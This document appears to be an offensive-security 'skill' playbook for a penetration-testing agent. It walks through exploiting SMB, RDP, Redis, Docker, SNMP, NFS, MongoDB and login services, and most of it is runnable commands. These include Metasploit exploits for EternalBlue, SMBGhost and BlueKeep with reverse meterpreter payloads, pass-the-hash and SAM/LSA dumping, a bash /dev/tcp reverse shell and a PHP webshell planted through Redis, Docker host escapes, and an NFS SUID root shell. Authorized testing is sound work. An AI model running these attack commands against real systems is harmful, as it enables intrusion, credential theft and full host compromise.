---
skill: network-protocol-exploitation-deep-aggressive
mitre_attack_id: T1190
owasp_mapping: [A05, A07]
difficulty: advanced
tags: [protocol-exploitation, smb, ms17-010, smbghost, rdp, bluekeep, redis, mongodb, docker, snmp, nfs, telnet, default-creds, metasploit-module-selection, deep-aggressive-mode]
---
## Summary
Deep Aggressive Mode network protocol exploitation. Drives every confirmed, versioned open service to its exploitation endpoint: SMB (MS17-010, SMBGhost), RDP (BlueKeep), Redis unauthenticated RCE, SNMP community abuse, NFS no_root_squash, Docker API escape, MongoDB unauth access, SMTP relay, Telnet/SSH default credentials. Covers auth-state triage, default-credential testing, and Metasploit module selection (scanner-to-exploit pairing). All exploitation occurs in sandbox or explicitly authorized targets; DoS-capable checks are prohibited.

Skill library references:
- skills/network-security/protocol-exploitation.md
- skills/service-enum/skill-playbook.md

## Phase 0 — Pre-Exploit Confirmation Gates
1. Service version confirmed by nmap -sV and manual banner grab (two methods)
2. Service is in scope and authorized per ROE
3. Exploit prerequisites verified (patch state, NLA state, protocol version, auth state)
4. Validation tier chosen: sandbox-first for Critical/High findings
5. Set up multi/handler listener before firing any reverse-payload exploit:
   `msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD <payload>; set LHOST <attacker>; set LPORT <port>; run -j'`

## Phase 1 — Auth-State Triage (all open protocols)
```bash
# SMB
smbclient -L //<target> -N
crackmapexec smb <target> -u '' -p '' --shares --pass-pol
nmap -p 139,445 -sV -sC <target>
nmap -p 445 --script smb2-capabilities,smb2-security-mode <target>
# RDP
nmap -p 3389 --script rdp-ntlm-info,rdp-enum-encryption <target>
# Redis
redis-cli -h <target> INFO
# MongoDB
mongosh "mongodb://<target>:27017" --eval 'db.runCommand({connectionStatus:1})'
# Docker
curl http://<target>:2375/version
curl http://<target>:2375/containers/json
# SNMP
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>
# NFS
showmount -e <target>
# Telnet/SSH/FTP
nc -nv <target> 23; nc -nv <target> 22; nc -nv <target> 21
```

## Phase 2 — SMB Exploitation
### MS17-010 EternalBlue (Windows <= Win8/Server 2008)
```bash
nmap -p 445 --script smb-vuln-ms17-010 <target>
msfconsole -q -x 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS <target>; run'
msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <target>; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <attacker>; run'
# Non-64-bit fallback
msfconsole -q -x 'use exploit/windows/smb/ms17_010_psexec; set RHOSTS <target>; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <attacker>; run'
```
### SMBGhost CVE-2020-0796 (Win10/Server 1903-1909)
```bash
nmap -p 445 --script smb2-capabilities,smb2-security-mode <target>
msfconsole -q -x 'use exploit/windows/smb/cve_2020_0796_smbghost; set RHOSTS <target>; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <attacker>; run'
```
### SMB Lateral Movement / Password Spray / PTH
```bash
crackmapexec smb <target> -u users.txt -p 'Spring2026!' --continue-on-success
crackmapexec smb <target> -u Administrator -H <NTHASH> -x whoami
crackmapexec smb <target> -u Administrator -p 'P@ssw0rd' --exec-method wmiexec -x 'whoami'
crackmapexec smb <target> -u Administrator -H <NTHASH> --sam --lsa
python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes :<NTHASH> Administrator@<target>
python3 /usr/share/doc/python3-impacket/examples/smbexec.py domain.local/Administrator:'P@ssw0rd'@<target>
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py domain.local/Administrator@<target>
python3 /usr/share/doc/python3-impacket/examples/atexec.py domain.local/Administrator@<target> whoami
```

## Phase 3 — RDP Exploitation
### BlueKeep CVE-2019-0708 (Win7/Server 2008, NLA off)
```bash
msfconsole -q -x 'use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS <target>; run'
msfconsole -q -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS <target>; set TARGET 1; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <attacker>; run'
```
### NLA Bypass / Weak Credentials
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://<target> -t 1
msfconsole -q -x 'use auxiliary/scanner/rdp/rdp_scanner; set RHOSTS <target>; run'
```
Prohibited: rdp-vuln-ms12-020 DoS-capable check against production.

## Phase 4 — Redis Unauthenticated RCE
If `redis-cli -h <target> INFO` returns data without auth:
```bash
# 1. SSH authorized_keys write
ssh-keygen -t rsa -f /tmp/redis_key -N ""
(echo -e "\n\n"; cat /tmp/redis_key.pub; echo -e "\n\n") > /tmp/spaced_key.txt
cat /tmp/spaced_key.txt | redis-cli -h <target> -x set ssh_key
redis-cli -h <target> CONFIG SET dir /var/lib/redis/.ssh
redis-cli -h <target> CONFIG SET dbfilename authorized_keys
redis-cli -h <target> SAVE
ssh -i /tmp/redis_key redis@<target>
# 2. Crontab reverse shell (Ubuntu)
echo -e "\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker>/4444 0>&1'\n\n" | redis-cli -h <target> -x set 1
redis-cli -h <target> CONFIG SET dir /var/spool/cron/crontabs/
redis-cli -h <target> CONFIG SET dbfilename root
redis-cli -h <target> SAVE
# 3. PHP webshell (known webroot)
redis-cli -h <target> CONFIG SET dir /var/www/html
redis-cli -h <target> CONFIG SET dbfilename shell.php
redis-cli -h <target> SET payload "<?php system($_GET['cmd']); ?>"
redis-cli -h <target> SAVE
# 4. Module RCE (Redis <= 5.0.5)
python3 redis-rogue-server.py --rhost <target> --lhost <attacker>
msfconsole -q -x 'use exploit/linux/redis/redis_replication_cmd_exec; set RHOSTS <target>; set LHOST <attacker>; set PAYLOAD linux/x64/meterpreter/reverse_tcp; run'
msfconsole -q -x 'use exploit/linux/redis/redis_debian_sandbox_escape; set RHOSTS <target>; run'
```

## Phase 5 — Docker API Escape (2375/2376)
```bash
curl http://<target>:2375/version
curl http://<target>:2375/containers/json
docker -H tcp://<target>:2375 run -it --privileged --net=host --pid=host -v /:/mnt alpine chroot /mnt sh
docker -H tcp://<target>:2375 run -it --privileged --pid=host alpine nsenter -t 1 -m -u -i -n sh
msfconsole -q -x 'use auxiliary/scanner/http/docker_version; set RHOSTS <target>; run'
msfconsole -q -x 'use exploit/linux/http/docker_daemon_tcp; set RHOSTS <target>; set LHOST <attacker>; run'
```

## Phase 6 — SNMP Exploitation
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>
msfconsole -q -x 'use auxiliary/scanner/snmp/snmp_login; set RHOSTS <target>; run'
# Read-only harvest
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.4.2.1.2    # processes
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.6.3.1.2    # software
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.6.13.1.3      # open TCP ports
msfconsole -q -x 'use auxiliary/scanner/snmp/snmp_enum; set RHOSTS <target>; run'
msfconsole -q -x 'use auxiliary/scanner/snmp/snmp_enumusers; set RHOSTS <target>; run'
# Write-enabled (private) community: config hijack
msfconsole -q -x 'use auxiliary/scanner/snmp/snmp_set; set RHOSTS <target>; run'
msfconsole -q -x 'use auxiliary/scanner/snmp/cisco_config_tftp; set RHOSTS <target>; set TFTPHOST <attacker>; run'
```

## Phase 7 — NFS no_root_squash
```bash
showmount -e <target>
mkdir -p /mnt/nfs
mount -t nfs <target>:/<share> /mnt/nfs -o nolock,vers=2
# Root write when no_root_squash: SUID shell
cp /bin/bash /mnt/nfs/bash_suid
chmod u+s /mnt/nfs/bash_suid
# /mnt/nfs/bash_suid -p on target -> root shell
# UID/GID impersonation when trusted (non-squashed)
useradd -u <uid> tmpuser && su tmpuser -c 'cat /mnt/nfs/secret'
msfconsole -q -x 'use auxiliary/scanner/nfs/nfsmount; set RHOSTS <target>; run'
```

## Phase 8 — MongoDB / SMTP / Telnet / SSH
```bash
# MongoDB unauth
mongosh "mongodb://<target>:27017" --eval 'db.adminCommand({listDatabases:1});'
mongodump --host <target> --out /tmp/mongodump
# SMTP open relay
nmap -p 25 --script smtp-open-relay <target>
nc -nv <target> 25
# MAIL FROM / RCPT TO / DATA relay test
msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS <target>; run'
# Telnet default creds
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt telnet://<target> -t 4
msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_login; set RHOSTS <target>; set USERPASS_FILE /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt; run'
# SSH weak creds / vendor backdoors
msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS <target>; set USERPASS_FILE /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt; set STOP_ON_SUCCESS true; run'
msfconsole -q -x 'use auxiliary/scanner/ssh/fortinet_backdoor; set RHOSTS <target>; run'
msfconsole -q -x 'use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS <target>; run'
```

## Phase 9 — Default Credential Matrix
| Service | Username | Password |
|---|---|---|
| FTP | anonymous / ftp | anonymous / email / blank |
| MySQL | root | blank |
| PostgreSQL | postgres | blank / postgres |
| MSSQL | sa | blank |
| SNMP | public (RO) / private (RW) | community strings |
| Redis | default (no auth) | blank |
| MongoDB | none | none (no auth) |
| Docker API | none | none (TLS off) |
| Telnet | root/admin | root/admin/blank |
| IPMI | admin | admin |

## Phase 10 — Verification (Sandbox)
- [ ] PoC replayed in isolated sandbox (docker/vagrant) for independent confirmation
- [ ] Deterministic proof for Critical/High: session established, command output captured
- [ ] Exploit prerequisites re-verified before target use
- [ ] No production impact beyond authorization (no DoS-capable modules)
- [ ] Credentials/hashes handled via vault-agent, never written to logs
- [ ] Post-exploitation scope respected (no lateral movement outside ROE)
- [ ] Metasploit module selection documented per protocol (detect + exploit pairing)

## References
- Skill library: skills/network-security/protocol-exploitation.md, skills/service-enum/skill-playbook.md
- MITRE ATT&CK T1190: https://attack.mitre.org/techniques/T1190/
- MITRE ATT&CK T1210: https://attack.mitre.org/techniques/T1210/
- MS17-010 advisory: https://msrc.microsoft.com/update-guide/en-US/advisory/MS17-010
- CVE-2020-0796: https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0796
- CVE-2019-0708 (BlueKeep): https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-0708
- redis-rogue-server: https://github.com/n0b0dyCN/redis-rogue-server

Prohibited: ms12_020_check/DoS actions, EternalBlue against unsupported targets, real credential dumping in production, unauthorized container escapes, default-credential attempts outside authorized scope.
